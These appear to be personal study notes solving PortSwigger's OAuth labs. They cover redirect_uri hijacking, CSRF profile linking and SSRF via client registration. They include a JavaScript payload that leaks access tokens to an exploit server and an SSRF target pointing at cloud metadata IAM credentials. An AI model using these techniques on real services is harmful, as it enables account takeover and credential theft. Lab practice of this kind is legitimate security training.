# OAuth

### Labs Portswigeer 
e.g.) The main request to play with is ```/auth?client_id=...```  
1. Authentication bypass via OAuth implicit flow
>Intercept the whole process of OAuth authentication and observe /authenticate POST request that contains email and username. Change these parameters to carlos'.

2. Forced OAuth profile linking
>Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.
```

```

3. OAuth account hijacking via redirect_uri
>Intercept the whole process of OAuth authentication and observe /auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx, change redirect_uri to your exploit server and Generate CSRF PoC, drop the request. Send it to victim and find out his /oauth-callback?code.

4. Stealing OAuth access tokens via an open redirect
>4.1 Same as the previous one observe ```/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx```.  
>4.2 On home page open any post and at the bottom observe "Next post" button. It is open redirect.  
>4.3 Write the next URL:  
>. . . ```redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/``` . . .  
>This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS.  
>4.4 Write final payload:  
```
<script>
    if (!document.location.hash) {
        window.location = "https://oauth-xxx.web-security-academy.net/auth?client_id=np1l4fiaizdo4d6r09enk&redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/&response_type=token&nonce=-2091701200&scope=openid%20profile%20email"
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```

5. SSRF via OpenID dynamic client registration

This task involves exploiting an OAuth service by registering a fake client application and using the logo_uri property to make the OAuth server fetch sensitive metadata from an internal URL. Here's the step-by-step process:
>5.1 Log in to your account and access the OAuth server's configuration file at /.well-known/openid-configuration.  
>5.2 Register a new client application by sending a POST request to /reg. Include a redirect_uris array with an arbitrary URL.  
>5.3 Check the OAuth flow using Burp to see that the "Authorize" page fetches the client application's logo from a specific URL.  
>5.4 Modify the registration request to include a logo_uri property.Replace the logo_uri with a URL pointing to sensitive metadata (http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/).    
>5.5 Trigger the logo fetch request by sending a GET request to the logo's endpoint using the new client ID.  
>5.6 Fetch the logo again using the new client ID to retrieve sensitive information, such as the secret access key, from the OAuth provider's cloud environment.
